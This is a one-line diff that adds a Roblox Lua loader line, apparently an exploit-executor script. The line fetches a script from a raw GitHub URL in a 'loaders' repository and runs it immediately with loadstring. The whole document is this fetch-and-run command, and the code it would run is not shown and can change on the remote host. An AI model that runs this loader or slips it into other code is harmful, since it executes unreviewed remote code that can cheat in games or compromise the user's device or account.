@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/kukirin-life-testing-spam5-8ym9ithsm8xv87.lua"))()
